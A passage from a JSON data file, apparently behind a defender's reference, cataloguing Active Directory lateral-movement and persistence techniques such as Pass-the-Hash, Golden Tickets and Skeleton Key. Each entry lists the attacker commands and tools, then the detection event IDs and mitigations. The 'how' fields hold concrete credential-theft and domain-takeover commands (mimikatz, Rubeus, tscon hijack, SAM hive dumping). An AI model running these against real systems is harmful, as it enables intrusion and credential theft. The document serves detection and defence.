indicators.","events":"4624(ローカルNTLM), Sysmon 11(FileCreate), 4688","mitigate":"Apply the January 2023 patch. Enable SMB signing and detect Potato-family token manipulation/reflection with EDR. Enforce least privilege and application control."},{"name":"Pass-the-Hash (PtH)","aka":"NTLM hash reuse / pth-winexe","phase":"lateral","group":"Lateral Movement","mitre":"T1550.002","cve":"","sev":"Critical","summary":"Uses a captured NTLM hash in place of a plaintext password to complete NTLM authentication and authenticate to other hosts.","how":"Obtain NT hashes from mimikatz (sekurlsa::logonpasswords / sekurlsa::pth), LSASS dumps, DCSync, or SAM dumps. Requires a local/domain-admin-equivalent hash and reachability to SMB (445), etc. Generate an impersonation token with mimikatz sekurlsa::pth /user /domain /ntlm:<hash> /run:cmd, then move laterally via impacket's -hashes option or NetExec (nxc smb <ip> -u user -H <hash>). Reuse of the local Administrator hash is a typical abuse path.","tools":"mimikatz, impacket(psexec/wmiexec -hashes), NetExec, Metasploit psexec, pth-toolkit","detect":"Monitor logon event 4624 with LogonType=3 and AuthenticationPackage=NTLM, LmPackageName='NTLM V1/V2', appearing for admin accounts across many hosts. Detect short-window NTLM authentication from a single workstation name to multiple servers, and abnormal access to LSASS (Sysmon EventID 10, target lsass.exe).","events":"4624(LogonType 3/9), 4776, Sysmon 10(lsass access), 4672","mitigate":"Make local admin passwords unique with LAPS to eliminate hash reuse. Protect lsass credentials with Credential Guard, and adopt Protected Users group / management tier separation, SMB signing, Restricted Admin / Remote Credential Guard. Prohibit interactive logon of domain admins to member servers."},{"name":"Pass-the-Ticket (PtT)","aka":"Kerberos ticket injection / Golden/Silver Ticket abuse","phase":"lateral","group":"Lateral Movement","mitre":"T1550.003","cve":"","sev":"Critical","summary":"Inject stolen or forged Kerberos TGT/TGS tickets into memory to authenticate to resources without a password or hash.","how":"Extract TGT/TGS from memory (.kirbi/ccache) via mimikatz sekurlsa::tickets /export or Rubeus dump/triage/monitor; requires access to the ticket holder's session. Inject the ticket into the current session with Rubeus ptt /ticket:<file> or mimikatz kerberos::ptt, then access SMB/WinRM/etc. Golden Tickets (forged with the krbtgt hash) and Silver Tickets (forged for a specific SPN with a service account hash) are injected as forms of PtT. On impacket/Linux, use the KRB5CCNAME environment variable to load the ccache.","tools":"Rubeus(dump/ptt), mimikatz(sekurlsa::tickets, kerberos::ptt), impacket(getST, -k -no-pass), ticketer.py","detect":"Anomalies in TGT/TGS requests (4768/4769): ticket encryption type RC4 (0x17) in an AES environment, account/host name mismatch, use of an existing TGT outside its validity period. Golden Tickets carry nonexistent accounts or abnormal lifetimes (10 years). Monitor endpoints for Rubeus/mimikatz execution artifacts.","events":"4768, 4769, 4770, 4624(LogonType 3), 4672","mitigate":"Periodically reset the krbtgt password (twice in succession) to invalidate Golden Tickets. Enforce AES encryption and disable RC4; shorten ticket lifetimes. Use the Protected Users group to block ticket delegation/RC4. Minimize exposure of privileged accounts on member servers."},{"name":"Overpass-the-Hash / Pass-the-Key","aka":"PtK / TGT acquisition from an NTLM hash","phase":"lateral","group":"Lateral Movement","mitre":"T1550.002","cve":"","sev":"Critical","summary":"Use an NTLM hash or AES key to perform a Kerberos AS-REQ and obtain a legitimate TGT, then move laterally via Kerberos (bridging PtH and PtT).","how":"Obtain an NTLM hash or AES128/256 key via LSASS dump etc. (prerequisite). Request and inject a TGT with mimikatz sekurlsa::pth /user /domain /ntlm:<hash> /run:powershell, or Rubeus asktgt /user:<u> /rc4:<hash> (preferred: /aes256:<key>). Using an AES key instead of RC4 avoids the anomalous RC4 artifact in events. Use the acquired TGT to Kerberos-authenticate to SMB/WMI/WinRM. In impacket use getTGT.py -hashes / -aesKey.","tools":"Rubeus(asktgt), mimikatz(sekurlsa::pth), impacket getTGT.py","detect":"A 4768 where a TGT is issued from the same host using only a hash, an RC4-encrypted AS-REQ occurring in an otherwise AES environment, or a pattern where a Kerberos ticket suddenly appears without a preceding NTLM logon. Detect by correlating with LSASS access.","events":"4768(暗号化タイプ0x17/0x12), 4769, 4624","mitigate":"Allow AES encryption only and disable RC4 to surface PtK artifacts. Protect keys with Credential Guard; use LAPS and Tier separation. Rotate account credentials regularly."},{"name":"PsExec (service exec over SMB)","aka":"Sysinternals PsExec / impacket psexec.py","phase":"lateral","group":"Lateral Movement","mitre":"T1570, T1021.002, T1569.002","cve":"","sev":"High","summary":"Drop a service binary to the ADMIN$ share over SMB (445) and start it as a service via the SCM for remote code execution.","how":"Requires local admin rights on the target and SMB reachability. Sysinternals PsExec \\\\target -s cmd or impacket psexec.py domain/user:pass@target copies an executable (e.g. PSEXESVC.exe/random name) to ADMIN$, creates and starts a service via svcctl RPC, and relays I/O over a named pipe. Supports PtH (-hashes). NetExec --exec-method smbexec (or atexec/mmcexec) can also execute (no psexec method exists).","tools":"PsExec(Sysinternals), impacket psexec.py, NetExec (--exec-method smbexec/atexec/mmcexec), Metasploit psexec_psh","detect":"Service install 7045 (random/PSEXESVC service name, ImagePath a temp file in ADMIN$), 4697, writes to ADMIN$ (5145 share access, RelativeTargetName), service start following 4624 LogonType3. Sysmon 17/18 on named pipes (psexecsvc, RemComSvc).","events":"7045, 4697, 5145, 4624(Type3), 5140, Sysmon 17/18","mitigate":"Restrict access to admin shares (ADMIN$/C$), enforce SMB signing, block workstation-to-workstation 445 with the host firewall. Prevent local admin reuse with LAPS. Correlate service creation + temp executable in EDR. Restrict network logon for privileged accounts."},{"name":"WMI Lateral Movement (wmiexec)","aka":"wmiexec.py / Invoke-WmiMethod / wmic process call create","phase":"lateral","group":"Lateral Movement","mitre":"T1047, T1021.003","cve":"","sev":"High","summary":"Spawn a remote process via WMI over DCOM/RPC (135 + dynamic ports) to run commands without writing files to disk.","how":"Requires admin rights and WMI (135/DCOM) reachability. Execute via impacket wmiexec.py domain/user@target (semi-interactive, output written to an SMB share), wmic /node:target process call create \"cmd\", PowerShell Invoke-WmiMethod -Class Win32_Process -Name Create, or Invoke-CimMethod. Spawns the process via Win32_Process without creating a service, leaving fewer artifacts than PsExec. Supports PtH (-hashes).","tools":"impacket wmiexec.py, wmic, PowerShell(Invoke-WmiMethod/CimMethod), NetExec --exec-method wmiexec, wmiexec-Pro","detect":"cmd.exe/powershell.exe spawned with wmiprvse.exe (WmiPrvSE) as parent (Sysmon 1 ParentImage=WmiPrvSE.exe), remote Win32_Process calls. WMI activity immediately after 4624 LogonType3, writes to ADMIN$/C$ for output (5145). WMI-Activity Operational log.","events":"4624(Type3), Sysmon 1(親WmiPrvSE.exe), Microsoft-Windows-WMI-Activity/Operational, 5145","mitigate":"Restrict host-to-host DCOM/WMI (135 + high ports) with the firewall; separate WMI per Tier. Detect command-shell spawns under WmiPrvSE in EDR. Use LAPS/credential protection and minimize network logon for privileged accounts."},{"name":"WinRM Lateral Movement (evil-winrm / PowerShell Remoting)","aka":"PSRemoting / WS-Management / Enter-PSSession","phase":"lateral","group":"Lateral Movement","mitre":"T1021.006, T1059.001","cve":"","sev":"High","summary":"Establish a remote PowerShell session over WinRM (5985/5986) WS-Management and run commands.","how":"Requires WinRM enabled on the target, Remote Management Users/admin rights, and 5985/5986 reachability. Execute via evil-winrm -i target -u user -p pass (or PtH: -H hash, Kerberos: -r realm), PowerShell Enter-PSSession / Invoke-Command -ComputerName target -ScriptBlock, or the NetExec winrm module. Supports fileless execution, upload/download, and AMSI bypass.","tools":"evil-winrm, PowerShell Remoting(Invoke-Command/Enter-PSSession), NetExec winrm, impacket各種の-k連携","detect":"Spawn of wsmprovhost.exe (WinRM host) with commands executed as its children (Sysmon 1 ParentImage=wsmprovhost.exe). WinRM/Operational log, 4624 LogonType3, obfuscated commands in PowerShell ScriptBlock logs (4104). Anomalous internal connections to 5985/5986.","events":"4624(Type3), Sysmon 1(親wsmprovhost.exe), Microsoft-Windows-WinRM/Operational, 4103/4104","mitigate":"Disable WinRM on hosts that don't need it; restrict WinRM sources via IPSec or TrustedHosts. Enable PowerShell ScriptBlock/module logging and AMSI. Limit operations with JEA (Just Enough Administration). Apply Tier separation and network segmentation."},{"name":"DCOM Lateral Movement (dcomexec)","aka":"MMC20.Application / ShellWindows / ShellBrowserWindow / ExcelDDE / Outlook.Application","phase":"lateral","group":"Lateral Movement","mitre":"T1021.003","cve":"","sev":"High","summary":"Remotely invoke exposed methods of DCOM objects (ExecuteShellCommand, etc.) for indirect command execution.","how":"Requires admin rights and DCOM (135) reachability. Multiple variants: PowerShell [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','target')).Document.ActiveView.ExecuteShellCommand(...), ShellWindows/ShellBrowserWindow (by CLSID) Navigate/Document.Application.ShellExecute, Excel.Application DDEInitiate, Outlook.Application CreateObject, etc. impacket dcomexec.py -object MMC20|ShellWindows|ShellBrowserWindow. Execution occurs as a child of the DCOM server process, so it is used for detection evasion.","tools":"impacket dcomexec.py, PowerShell(CreateInstance/GetTypeFromProgID), Invoke-DCOM.ps1, SharpDCOM","detect":"Anomalous cmd.exe/powershell.exe spawned with a DCOM server such as mmc.exe/explorer.exe/excel.exe as parent (Sysmon 1 anomalous ParentImage). Correlation of DCOM activation over 135 with an immediately following process spawn, 4624 LogonType3. DCOM launch events (10028, etc.).","events":"4624(Type3), Sysmon 1(親mmc/explorer/excel等), 10028(DistributedCOM), 5145","mitigate":"Harden DCOM launch/access permissions (dcomcnfg); restrict host-to-host port 135. Detect shell spawns from Office apps or mmc.exe in EDR. Restrict DCOM permissions on attackable ProgIDs/CLSIDs and disable unnecessary COM servers."},{"name":"SMBexec (semi-interactive shell)","aka":"impacket smbexec.py / CME smbexec","phase":"lateral","group":"Lateral Movement","mitre":"T1021.002, T1569.002","cve":"","sev":"High","summary":"A more fileless technique: create a temporary service over SMB, run commands via cmd, and retrieve output through a shared file.","how":"Requires local admin and SMB (445). impacket smbexec.py domain/user:pass@target creates a temporary service for each command execution, runs the command via %COMSPEC%, writes output to a share (typically C$ Temp), and reads it back over SMB. Differs from PsExec in that it places no binary on disk. Supports PtH (-hashes). Also usable via NetExec --exec-method smbexec.","tools":"impacket smbexec.py, NetExec --exec-method smbexec","detect":"Repeated creation/deletion of temporary services in a short window (7045/7034/7036), ImagePath starting with a %COMSPEC% /Q /c echo ... string, share writes of temp files like __output/BTOBTO (5145). cmd.exe spawned with services.exe as parent.","events":"7045, 7036, 4697, 5145, 4624(Type3), Sysmon 1(親services.exe)","mitigate":"Restrict admin share access, SMB signing, block 445 with the host firewall, LAPS. Detect service ImagePaths containing %COMSPEC% and repetitive service creation in EDR. Minimize network logon for privileged accounts."},{"name":"Lateral Movement via Scheduled Tasks (atexec)","aka":"impacket atexec.py / schtasks /s / ATSVC","phase":"lateral","group":"Lateral Movement","mitre":"T1053.005, T1021.002","cve":"","sev":"High","summary":"Create and immediately run a scheduled task on a remote host to execute commands.","how":"Requires admin rights and RPC/SMB (135/445, Task Scheduler ATSVC/ITaskSchedulerService pipe) reachability. schtasks /create /s target /tn <name> /tr \"cmd\" /sc once /st ... /ru SYSTEM followed by /run, or impacket atexec.py domain/user@target \"command\" (create task -> run -> collect output -> delete). Supports PtH/Kerberos. Abused to run tasks with SYSTEM privileges.","tools":"impacket atexec.py, schtasks.exe(/s), NetExec --exec-method atexec, PowerShell ScheduledTasks module","detect":"Remotely created tasks in the Task Scheduler Operational log (EventID 106 register/140 update/141 delete/200 execute), 4698 (task creation)/4702 (update), short-lived tasks run and deleted immediately after creation. Correlation with 4624 LogonType3. cmd/powershell spawned with TaskEngine as parent.","events":"4698, 4699, 4702, 4700/4701, Microsoft-Windows-TaskScheduler/Operational(106/140/141/200/201), 4624","mitigate":"Restrict remote task creation by firewall/permissions; control remote access to the Task Scheduler service. Enable auditing of task creation/deletion and correlate in SIEM. LAPS/Tier separation, restrict network logon for privileged accounts."},{"name":"Lateral Movement via Service Creation (services / SCShell)","aka":"sc create / impacket services.py / SCShell (ChangeServiceConfig)","phase":"lateral","group":"Lateral Movement","mitre":"T1543.003, T1569.002, T1021.002","cve":"","sev":"High","summary":"Use the remote SCM (svcctl) to create a new service, or rewrite an existing service's binary path, to execute arbitrary code.","how":"Requires local admin and RPC/SMB (445, svcctl pipe). sc \\\\target create svc binPath= \"cmd /c ...\" && sc \\\\target start svc, or create/start/delete via impacket services.py. SCShell is a fully fileless technique that places no new binary, temporarily rewriting an existing service's binPath with ChangeServiceConfigW and starting it (supports PtH/Kerberos). Runs as SYSTEM.","tools":"sc.exe, impacket services.py, SCShell, NetExec, PowerShell New-Service","detect":"7045 (new service) or ImagePath change of an existing service (4657 registry, 7040 start-type change, 4697). binPath containing cmd/powershell/suspicious paths. SCShell's artifact is the temporary ImagePath alteration and immediate restoration of an existing service. Correlation with 4624 LogonType3.","events":"7045, 4697, 4657(Services レジストリ), 7040, 4624(Type3)","mitigate":"Restrict remote SCM access and service-config change rights; audit the ImagePath registry of critical services (4657). Detect shell spawns from services.exe children in EDR. LAPS/Tier separation, host-to-host 445 restrictions."},{"name":"Token Impersonation (Token Theft)","aka":"incognito / mimikatz token::elevate / Potato family / MakeToken","phase":"lateral","group":"Lateral Movement","mitre":"T1134.001, T1134.002, T1134.003","cve":"","sev":"High","summary":"Steal and duplicate the access token of an existing process/thread to impersonate that user for lateral movement or account switching.","how":"Requires SeImpersonate/SeAssignPrimaryToken privileges or admin rights, plus a process holding the target user's token. Meterpreter incognito (list_tokens/impersonate_token), mimikatz token::list / token::elevate, Cobalt Strike steal_token, Rubeus/PowerShell MakeToken or the ImpersonateLoggedOnUser API. Steal a Domain Admin's token from a server where they are logged on and access network resources via delegation. Potato family (JuicyPotato/PrintSpoofer/RoguePotato) escalates from SeImpersonate to SYSTEM.","tools":"Meterpreter incognito, mimikatz(token::*), Cobalt Strike, PrintSpoofer/JuicyPotato, Invoke-TokenManipulation.ps1","detect":"Anomalous 4624 LogonType9 (NewCredentials, equivalent to runas /netonly) or 4648 (explicit-credential logon), unexpected token duplication from a privileged process. SeImpersonate abuse is detected via SYSTEM escalation over named pipes/RPC (Sysmon 17/18, a sudden jump in process integrity).","events":"4624(LogonType 9), 4648, 4672, Sysmon 17/18, 4696","mitigate":"Grant SeImpersonate/SeAssignPrimaryToken to the minimum set of service accounts. Do not let privileged accounts log on to low-trust hosts (Tier separation). Credential Guard, isolation of admin servers. Monitor token-manipulation APIs in EDR."},{"name":"RDP Session Hijack (tscon)","aka":"tscon session hijack / RDP shadow / unauthenticated session takeover from SYSTEM","phase":"lateral","group":"Lateral Movement","mitre":"T1563.002, T1021.001, T1550.002","cve":"","sev":"High","summary":"Connect to another user's existing RDP/console session with tscon under SYSTEM privileges to hijack their desktop without authentication.","how":"Requires local SYSTEM privileges (or SeTcbPrivilege). After confirming the target session ID with query user, running tscon <sessionID> /dest:<own session> in a SYSTEM context takes over another user's disconnected/connected session without a password. Elevate to SYSTEM via sc create sesshijack binpath=\"cmd /k tscon ...\" or PsExec -s. RDP Shadowing (shadow /control) and PtH RDP via mstsc /restrictedadmin are related variants.","tools":"tscon.exe(+query user), sc/PsExec -s, RDP Shadow(mstsc /shadow), SharpRDP, mstsc /restrictedadmin","detect":"Session reconnection in Terminal Services operational logs (4778 reconnect/4779 disconnect), tscon.exe execution, session connections by SYSTEM, query user/quser execution. Unexpected session ID switches or ownership changes of console/RDP sessions.","events":"4778, 4779, 4624(LogonType 10/7), 4634, 1149(TerminalServices-RemoteConnectionManager), Sysmon 1(tscon.exe)","mitigate":"Restrict admin access to RDP hosts with MFA, enforce Network Level Authentication (NLA), and apply auto-logoff of idle sessions / delete-disconnected-session policies. Require user consent for RDP Shadowing. Avoid privileged use of shared RDP servers and apply Tier separation."},{"name":"Lateral Movement via RDP / Restricted Admin & PtH-over-RDP","aka":"mstsc /restrictedadmin / xfreerdp /pth / SharpRDP","phase":"lateral","group":"Lateral Movement","mitre":"T1021.001, T1550.002","cve":"","sev":"High","summary":"Move laterally via interactive RDP logon (3389). Restricted Admin mode allows RDP authentication with only a hash (PtH over RDP).","how":"Requires 3389 reachability and interactive logon rights on the target (Remote Desktop Users/admin). Normally a credential logon via mstsc. If Restricted Admin is enabled, xfreerdp /u:user /pth:<NThash> /v:target or mstsc /restrictedadmin allows PtH logon without a password (user credentials are not delegated to or left on the target; subsequent network authentication runs in the target machine's computer-account context, so user-credential reuse = double hop is not possible). SharpRDP executes commands over RDP without an interactive GUI.","tools":"mstsc(/restrictedadmin), xfreerdp(/pth), SharpRDP, rdesktop, Cobalt Strike","detect":"Frequent 4624 LogonType10 (RemoteInteractive) for admin accounts, chained RDP across multiple hosts, 1149 connection events, Restricted Admin logon (LogonType3 + specific flags). Lateral 3389 connections from a pivot.","events":"4624(LogonType 10/3), 4778/4779, 1149, 21/24/25(TerminalServices-LocalSessionManager)","mitigate":"Limit RDP to jump hosts and restrict 3389 at the network, NLA/MFA. Evaluate the need for Restricted Admin and disable if unnecessary; if needed, manage delegation risk. Deploy Remote Credential Guard and apply Tier separation for privileged accounts."},{"name":"WinRS / Remote Shell","aka":"winrs.exe / WS-Man remote shell","phase":"lateral","group":"Lateral Movement","mitre":"T1021.006","cve":"","sev":"Medium","summary":"Use the WinRM WinRS client to establish a remote command shell over a path separate from PowerShell Remoting and execute commands.","how":"Requires WinRM enabled (5985/5986) and admin/Remote Management Users rights. winrs -r:target -u:user -p:pass cmd runs commands directly. Being cmd.exe-based, it can evade some PSRemoting monitoring. Also used over the same path by NetExec or manually.","tools":"winrs.exe, WS-Management API, NetExec","detect":"WinRM/Operational log, winrs.exe execution, conhost/cmd.exe started via the WinRM service, 4624 LogonType3, internal connections to 5985/5986.","events":"4624(Type3), Microsoft-Windows-WinRM/Operational, Sysmon 1(winrs/wsmprovhost)","mitigate":"Disable WinRM on hosts that don't need it, restrict sources (TrustedHosts/IPSec), JEA. Correlate WinRM logs with process creation. Tier separation."},{"name":"Lateral Movement via Remote Registry","aka":"reg /s / winreg RPC / Run key & service tampering","phase":"lateral","group":"Lateral Movement","mitre":"T1112, T1021.002, T1547.001","cve":"","sev":"Medium","summary":"Manipulate a remote registry via the Remote Registry service to indirectly execute code through service creation or Autorun entries.","how":"Requires admin rights and the Remote Registry service enabled (winreg RPC/445). Define a service and set ImagePath via `reg add \\\\target\\HKLM\\...\\Services\\...`, or register a payload under Run/RunOnce keys. Rewrite the remote registry with `impacket reg.py add`. Also used to steal LSA Secrets/credentials (`reg save HKLM\\SAM/SECURITY`), then chained into PtH etc.","tools":"reg.exe(\\\\target), impacket reg.py, PowerShell(remote registry), NetExec","detect":"Remote registry modifications (4657), additions to Run/RunOnce or Services keys, Remote Registry service start, `reg save` of SAM/SECURITY hives. Correlate with 4624 LogonType 3 and winreg named-pipe access.","events":"4657, 4624(Type3), 5145(winreg pipe), 7036(RemoteRegistry開始)","mitigate":"Disable the Remote Registry service on hosts that don't need it; enable auditing on key registry paths (4657). Restrict admin shares/RPC, deploy LAPS. Use EDR to detect service/Autorun changes made via remote registry."},{"name":"Lateral Movement/Exec via WMI Event Subscription","aka":"Permanent WMI Event Subscription (__EventFilter/CommandLineEventConsumer)","phase":"lateral","group":"Lateral Movement","mitre":"T1546.003, T1047","cve":"","sev":"Medium","summary":"Register a permanent WMI event subscription remotely so a trigger condition executes a command (lateral movement + persistence).","how":"Requires admin rights and WMI reachability (135/DCOM). In the remote root\\subscription namespace, register an __EventFilter (trigger), a CommandLineEventConsumer/ActiveScriptEventConsumer (payload), and a __FilterToConsumerBinding. Commands run as SYSTEM on logon or at a fixed interval (__IntervalTimerInstruction). Registered remotely via `Set-WmiInstance -ComputerName` or impacket/Invoke-WMIEvent-style tools.","tools":"PowerShell(Set-WmiInstance -ComputerName), Invoke-WMIEvent, WMImplant, mofcomp/mof登録","detect":"Creation of __EventFilter/Consumer/Binding under root\\subscription in the WMI-Activity log (Sysmon 19/20/21 WmiEvent), anomalous command execution by WmiPrvSE child processes. Remote CIM/WMI instance creation.","events":"Sysmon 19/20/21, Microsoft-Windows-WMI-Activity/Operational, 4624(Type3)","mitigate":"Periodically inventory and baseline WMI subscriptions; monitor Sysmon WmiEvent. Restrict DCOM/WMI remote access. Use EDR to detect CommandLineEventConsumer registration."},{"name":"Lateral Movement via Named Pipe Impersonation","aka":"SMB named pipe relay / GetSystem / pipe impersonation","phase":"lateral","group":"Lateral Movement","mitre":"T1134.001, T1134.002","cve":"","sev":"Medium","summary":"Impersonate a client connecting to an SMB named pipe to obtain its credential context, used for lateral movement or privilege escalation.","how":"Requires the right to create a named pipe. The attacker creates a server-side pipe; when a victim/service connects to it, the ImpersonateNamedPipeClient API can impersonate the client's token. Representative techniques are Meterpreter getsystem (named-pipe method) and Potato variants (lure SYSTEM to a pipe via RPC/DCOM and escalate with SeImpersonate). The obtained token is used for network access to adjacent hosts.","tools":"Meterpreter getsystem, PrintSpoofer/RoguePotato/JuicyPotato, Cobalt Strike, カスタムパイプサーバ","detect":"Sysmon 17/18 (anomalous pipe names: `\\\\.\\pipe\\` random/known-abuse names), SYSTEM process spawned from a low-privilege process, sudden grant of 4624 LogonType 9/4672. Correlate pipe connections via RPC/DCOM with token elevation.","events":"Sysmon 17/18, 4624(Type9), 4672, 4696","mitigate":"Minimize SeImpersonate privilege, apply latest patches (shrinking Potato-style attack surface), and use EDR to detect pipe impersonation and abrupt SYSTEM escalation. Review service account privileges."},{"name":"Lateral Movement via SSH (Windows OpenSSH / admin SSH)","aka":"OpenSSH Server on Windows / plink / SSH key reuse","phase":"lateral","group":"Lateral Movement","mitre":"T1021.004","cve":"","sev":"Medium","summary":"Move laterally by connecting to Windows OpenSSH or an admin SSH service using stolen credentials or keys.","how":"Requires OpenSSH Server (22) enabled on the target and valid credentials/private key. Authenticate via `ssh user@target`, plink, or a stolen ~/.ssh private key / tampered authorized_keys. With domain-integrated SSH, authenticate with AD credentials and execute commands directly. Chained lateral movement via key reuse and agent-forwarding abuse.","tools":"ssh/plink, 窃取秘密鍵, Metasploit ssh_login, NetExec ssh","detect":"Authentication events in OpenSSH/Operational logs, unexpected sshd startup on a host, 4624 LogonType 3 (SSH), changes to authorized_keys. Anomalous connections on internal port 22.","events":"4624(Type3), OpenSSH/Operational(sshd), 4688(sshd子プロセス)","mitigate":"Disable OpenSSH Server on hosts that don't need it; use key-based auth with a passphrase and source restrictions. Audit authorized_keys, rotate keys. Restrict SSH agent forwarding and enforce Tier separation."},{"name":"Payload Drop/Exec via Admin Shares","aka":"ADMIN$/C$ file copy + execution / net use","phase":"lateral","group":"Lateral Movement","mitre":"T1021.002, T1570","cve":"","sev":"High","summary":"A basic lateral movement technique: copy a file to ADMIN$ or C$ and launch it via a separate execution mechanism (task/service/WMI).","how":"Requires local admin and SMB (445). Stage with `net use \\\\target\\C$ /user:...` or `copy payload.exe \\\\target\\ADMIN$\\Temp\\`, then execute via schtasks/sc/WMI. It underpins many PtH tools and is deployed at scale via local-admin hash reuse (a ransomware-deployment staple).","tools":"net use/copy, impacket smbclient.py, NetExec --put-file/-x, robocopy","detect":"5140/5145 (write access to ADMIN$/C$ admin shares, executable in RelativeTargetName), 4624 LogonType 3, patterns of file distribution to many hosts in a short window. Correlate with service/task creation right after staging.","events":"5140, 5145, 4624(Type3), 7045/4698(後続実行)","mitigate":"Block workstation-to-workstation SMB (445) at the host firewall, audit admin-share access, enforce SMB signing. Use LAPS to prevent local-admin hash reuse, enforce Tier separation, and use EDR to correlate share writes with execution."},{"name":"Golden Ticket","aka":"krbtgt forged TGT / Kerberos Golden Ticket","phase":"dominance","group":"Dominance & Persistence","mitre":"T1558.001","cve":"","sev":"Critical","summary":"The ultimate persistence technique: abuse the krbtgt account hash to forge a TGT with arbitrary user identity and privileges.","how":"Requires the krbtgt account's NTLM hash (or AES256 key), the domain SID, and the domain FQDN, obtained via DCSync or NTDS.dit theft. The TGT can be forged offline, embedding arbitrary RIDs (by default RID 500, Domain Admins/Enterprise Admins groups, and krbtgt's PAC). It can be created without contacting a DC and given an arbitrary lifetime (10 years by default), enabling long-term stealth.","tools":"mimikatz (kerberos::golden), Rubeus (golden), impacket ticketer.py, Cobalt Strike","detect":"Anomalies such as a TGS-REQ (4769) occurring without a preceding TGT request (AS-REQ), or a ticket lifetime longer than the default. Logons for nonexistent or disabled accounts, PAC integrity errors, and mimikatz's default 10-year ticket lifetime are indicators. Microsoft Defender for Identity's Golden Ticket detection alert is effective.","events":"4769, 4768, 4624 (異常なアカウント/寿命)","mitigate":"Reset the krbtgt password twice in succession (spacing the resets to account for the KDC key history) to invalidate existing forged tickets. Minimize DC access, enforce Tier 0 management, and audit privileges to prevent DCSync. Build regular krbtgt rotation into operations."},{"name":"Silver Ticket","aka":"forged TGS / service ticket forgery","phase":"dominance","group":"Dominance & Persistence","mitre":"T1558.002","cve":"","sev":"High","summary":"Forge a TGS for a specific service using a service account's (including a computer account's) hash to gain access without going through the DC.","how":"Requires the NTLM/AES hash of the target service's service account (e.g., an account holding an SPN such as CIFS/HOST/MSSQLSvc, or a machine account). Because the TGS is forged directly, there is no communication with the KDC (DC) and little authentication logging on the DC. It works only per target service but is hard to detect, making it effective for localized persistence. It works on the many services where PAC validation is disabled.","tools":"mimikatz (kerberos::golden /service:cifs), Rubeus (silver), impacket ticketer.py","detect":"The strongest indicator is the gap where service access (4624) occurs without corresponding authentication logs (4768/4769) on the DC. Reconcile host-side logon events with DC Kerberos logs and monitor for anomalous PACs or SPN mismatches. Machine account password integrity validation also helps.","events":"4624 (ホスト側のみ、DCに4769なし)","mitigate":"Rotate service account passwords regularly; enable automatic machine account password rotation (30 days by default). Adopt gMSA/dMSA to make hash theft harder. Promote enforced KDC PAC validation (validated on the subject side)."},{"name":"Diamond Ticket","aka":"PAC-tampered TGT","phase":"dominance","group":"Dominance & Persistence","mitre":"T1558","cve":"","sev":"Critical","summary":"A forged TGT with improved detection evasion: obtain a legitimate TGT, decrypt it, tamper with the PAC, and re-encrypt.","how":"Requires possession of the krbtgt key (AES recommended). First obtain a legitimate TGT via a real AS-REQ, decrypt it with the krbtgt key, tamper with the PAC's groups/RIDs, and re-encrypt. Unlike a Golden Ticket, it is based on a real request, so the ticket structure and flags match legitimate ones and detection indicators like lifetime anomalies don't appear. A legitimate AS-REQ (4768) remains on the DC, evading gap-based detection.","tools":"Rubeus (diamond), impacket (改変)","detect":"Since it's hard to distinguish from a legitimate TGT, the focus is preventing krbtgt key leakage itself. Use behavioral analytics to detect mismatches between PAC groups and actual directory state, rapid privilege escalation, and anomalous access patterns. Relies on Defender for Identity advanced detection.","events":"4768, 4769 (正規に見える)","mitigate":"Regular krbtgt rotation, Tier 0 protection, and AES key protection. Deploy behavior-based detection (UEBA). Cut off the root cause by blocking DCSync/NTDS theft."},{"name":"Sapphire Ticket","aka":"S4U2self+U2U PAC-acquisition forged TGT","phase":"dominance","group":"Dominance & Persistence","mitre":"T1558","cve":"","sev":"Critical","summary":"The stealthiest Golden-family variant: obtain a real privileged user's legitimate PAC via S4U2self/U2U and embed it in a forged ticket.","how":"Requires the krbtgt key. Abuse the S4U2self+U2U (User-to-User) mechanism to obtain a fully legitimate PAC of a real privileged account (e.g., a Domain Admin) from the KDC. Placing that PAC as-is into the forged TGT makes the PAC contents fully match directory reality, making it harder to detect than Diamond. All attributes/signatures are legitimate.","tools":"impacket ticketer.py (-impersonate, sapphire対応), Rubeus","detect":"Content-based detection is nearly impossible since the PAC is legitimate. Infer via anomalous U2U/S4U request patterns, traces of krbtgt key usage, and correlation with unexpected access tied to the victim privileged account. Fundamentally, preventing krbtgt leakage is the only effective measure.","events":"4769 (S4U/U2U要求), 4768","mitigate":"krbtgt rotation and Tier 0 protection. Monitor for S4U-related anomalies. Prioritize preventing key leakage by blocking DCSync."},{"name":"Skeleton Key","aka":"Skeleton Key / LSASS-patching backdoor","phase":"dominance","group":"Dominance & Persistence","mitre":"T1556.001","cve":"","sev":"Critical","summary":"An in-memory backdoor that patches the DC's LSASS to allow authentication as any user with a master password.","how":"Requires Domain Admin-equivalent rights and SeDebugPrivilege on the DC. `mimikatz misc::skeleton` patches the LSASS process so that, in addition to the existing password, any account can authenticate with an arbitrary shared password (default `mimikatz`). It entails an RC4 downgrade and is cleared on reboot, so it's in-memory persistence. With multiple DCs, it must be applied to each DC.","tools":"mimikatz (misc::skeleton)","detect":"Monitor for suspicious code injection into LSASS / use of SeDebugPrivilege, regression of authentication encryption type to RC4 (downgrade), and traces of mimikatz execution on the DC. Detect events 4673/4611 and LSASS access (Sysmon EID 10). Defender for Identity's Skeleton Key detection alert is effective.","events":"4673(特権使用), 4768/4769(暗号化タイプ0x17=RC4への後退), Sysmon 10(LSASSアクセス)","mitigate":"Enable LSA Protection (RunAsPPL) to prevent LSASS patching. Deploy Credential Guard and application control (WDAC) on DCs. Minimize admin access to DCs and enforce AES to make RC4 regression easier to detect."},{"name":"Golden gMSA","aka":"Golden GMSA / KDS Root Key abuse","phase":"dominance","group":"Dominance & Persistence","mitre":"T1558","cve":"","sev":"High","summary":"Steal the KDS root key to compute gMSA (group Managed Service Account) passwords offline and persistently.","how":"Requires read access to the KDS root key (msKds-ProvRootKey, by default readable only by Domain Controllers/SYSTEM), typically obtained via DCSync or DA rights. From the root key and a gMSA's SID/attributes (msDS-ManagedPasswordId, etc.) the managedPassword can be computed offline; even if the gMSA password auto-rotates, future passwords can be predicted as long as the key is held, making it powerful persistence.","tools":"GoldenGMSA.exe, gMSADumper, Semperis GoldenGMSA","detect":"Monitor access (4662) to KDS root key objects (CN=Master Root Keys) and anomalous reads of a gMSA's msDS-ManagedPassword/ManagedPasswordId attributes. Correlate with DCSync or DA-privilege use, and detect KDS key access from ordinary endpoints.","events":"4662 (KDS Root Key/gMSA属性アクセス)","mitigate":"Strictly restrict read access to the KDS root key and enable access auditing. If a gMSA is compromised, consider recreating the KDS root key and the gMSA. Prevent key theft with Tier 0 protection and DCSync 